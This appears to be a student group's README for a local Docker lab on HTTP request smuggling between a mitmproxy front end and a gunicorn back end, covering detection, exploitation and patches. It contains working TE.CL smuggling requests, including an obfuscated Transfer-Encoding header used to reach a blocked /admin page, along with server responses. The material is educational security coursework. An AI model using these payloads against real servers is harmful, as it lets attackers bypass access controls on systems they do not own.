# CCSEP-Group1-HTTPRequestSmuggling

# README
Assignment Group 1
Ryan Thuys
Brodie Carpenter
Tanbir Irfan
Benjamin Kuuse
Gaye Mtwale

## HTTP Request Smuggling


### How to run with Docker:
Go into the file called CCSEPGroup1_HTTPRequestSmuggling and open a terminal
Ensure you have docker and docker compose installed
Run  ``` docker-compose build ```
Run ```docker-compose up```
Now the both servers are running



### How to run without Docker:
Install:
Python3
Pip
Flask
Requests
Mitmproxy
Gunicorn

Command to run Gunicorn from within BackendServer folder:
``` gunicorn -b 127.0.0.1:8000 --threads 8 myapp3:app ```
Command to run mitmproxy from within ProxyServer folder:
``` Mitmdump --mode reverse:http://0.0.0.0:8000 -p 8001 -s blockAdmin.py --no-http2 ```



From here on out the Transfer-Encoding header will be referred to as TE and the Content-Length header will be referred to as CL.




## Detection

### Method 1
The Timing Technique 
As an attacker, looking in on a program from the outside, receiving any sort of feedback on our requests from the website is invaluable. The guiding principle of using the timing technique is that we can receive feedback on whether the attack was successful or not depending on the time it takes to receive the response to our request.
```
POST / HTTP/1.1
Host: 127.0.0.1:8000
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
In this example, a request is processed in the frontend with the transfer-encoding header. The frontend server reads the body until it reaches the 0 with an empty line after it which signifies the end of the body and the request. The frontend server then sends that without the X. The backend server will read the content-length header which is 6, but there are less than 6 bytes which causes the backend to wait until it receives the extra byte, which it won't ever receive. This results in an observable delay which indicates to an attacker that the frontend and backend server are handling the request differently, alerting the attacker that the web server might be vulnerable to TE.CL.



### Method 2
Another method to detect a HTTP request smuggling vulnerability is to find out which server software each server uses. This is viable in this demo but may not be viable with other systems.

1. Send a request that will ensure a response from only the proxy such as a invalid chunked encoding request.
```
GET / HTTP/1.1
Host: 127.0.0.1:8001
Transfer-Encoding: chunked

g


```
	
	
2. This will get a response

```
HTTP/1.1 400 Bad Request
Server: mitmproxy 4.0.4
Connection: close
Content-Length: 290
Content-Type: text/html

<html>
            <head>
                <title>400 Bad Request</title>
            	</head>
            	<body>
            	<h1>400 Bad Request</h1>
            	<p>HttpSyntaxException(&quot;Invalid chunked encoding length: b&#x27;g\\r\\n&#x27;&quot;)</p>
            	</body>
        	</html>

```

3. The response above tells us the server is running mitmproxy 4.0.4. Now we need to send a response that makes it the back and, so any valid HTTP request will do. Even something as simple as:

```
GET / HTTP/1.1
Host: 127.0.0.1:8001


```
4. This will return a HTTP message with the same server header as the one above but with ```gunicorn/20.0.4```.



5. We can go from there and search the source code for how it parses headers.

From mitm proxy:
``` python
if "chunked" in headers.get("transfer-encoding", "").lower():
        return None 
```
This means that mitm searches for chunked within the Transfer-encoding value.


From gunicorn:
``` python
elif name == "TRANSFER-ENCODING":
        if value.lower() == "chunked":
               chunked = True 
```
This means that gunicorn matches the whole value string to “chunked” different to mitm which searches for string in string.



## Exploitation

Now that we know that the servers are vulnerable to TE:CL attacks we can craft a HTTP request to exploit that. The Repeater feature of Burp Suite Community will be used to edit and send the request.

The HTTP request must utilize the fact that the proxy server will read the transfer encoding header and the backend server will read the Content length header.

The website has a /admin page which is inaccessible through the proxy so a request for that page must be smuggled to the back end where there are no security checks.

```
GET / HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 4
Transfer-Encoding: xxxchunkedxxx

15
GET /admin HTTP/1.1

16
Host: 127.0.0.1:8001


0

GET / HTTP/1.1
Host: 127.0.0.1:8001


```
The mitmproxy server will read the Transfer Encoding chunked header for 2 reasons:
The proxy server searches the TE header for “chunked: within the string rather than seeing if the whole string matches chunked
The RFC standards state that if both TE chunked and CL are given, TE chunked must be used.
This means the proxy server reads up to the line with  just a 0 as the body and so does not realise that is actually another HTTP request and it is smuggled past the security check for /admin page. The Gunicorn backend server reads the content length header because it tries to match the whole string and fails because there are extra letters surrounding chunked. So the backend server reads the content length and thinks the request ends after “15” and returns the HTML page. The server then thinks the line after that “GET /admin HTTP/1.1” is part of a new request and since the security check for /admin is on the proxy server it will return that page as well. But the proxy server only sent 1 request and so it will only return 1 page. So we added another HTTP request after the 0 which ensures the /admin page is returned. 

You may need to send the request a couple of times but the correct response will look something like this:

```
HTTP/1.1 200 OK

Server: gunicorn/20.0.4

Date: Sat, 04 Sep 2021 09:50:04 GMT

Connection: keep-alive

Content-Type: text/html; charset=utf-8

Content-Length: 35



You made it to our lovely website

HTTP/1.1 200 OK

Server: gunicorn/20.0.4

Date: Sat, 04 Sep 2021 09:50:04 GMT

Connection: keep-alive

Content-Type: text/html; charset=utf-8

Content-Length: 26



Super secret admin content

```

Two responses are returned one for the first main page and the other for the /admin page. And you are done, you successfully got access to the admin page that you should not have access too. 


## Patch
```
gunicorn --keep-alive 0 --threads 8 --bind 0.0.0.0:8000 myapp3:app
```

The first would be to use the “keep alive” flag when launching the gunicorn web server. The keep alive flag can be used to set a connection timeout, and a maximum number of requests. Without this flag, usually it would allow a user to send multiple requests over a single TCP link which is essential for request smuggling. What's important here is our use of the 0 parameter, this disallows users from requesting a keep alive connection, limiting their number of requests to one per session. With this in place, a would-be attacker can send a smuggled http request through the proxy to the backend, but the backend will only read the first request, and disregard the other.
```
If ‘chunked’ in value.lower()
```
The second way to patch the web server is to rewrite how gunicorn deals with chunked headers. Pre patch, Gunicorn was only prepared to properly deal with a chunked header if the entire header was equal to “chunked”, of course this could be attacked by first writing chunked but then adding extra letters. To address this problem, instead of detecting if the header is equal to chunked, we instead detect if the header contains chunked, this actually prevents the attack, successfully identifying the chunked header. This ensures the proxy server sends correct requests to the backend server which fends off desync. This solution is specific to gunicorn, and if proper chunked header management is already implemented then this solution would be less applicable.


The second way to patch the web server is to ensure mitmproxy and gunicorn parse headers in the same way. Pre patch, Gunicorn was only prepared to properly deal with a chunked header if the entire header was equal to “chunked”,  and mitmproxy searched for chunked inside the string. This of course could be attacked by first writing chunked but then adding extra letters. To address this problem, instead of detecting if the header is equal to chunked, we instead detect if the header contains chunked which is the same as mitmproxy. This ensures the proxy server parses the headers in the same way as gunicorn which prevents the servers from desync. This solution is specific to gunicorn and mitmproxy and both servers parsed the headers in the same way HTTP request smuggling would not be possible.
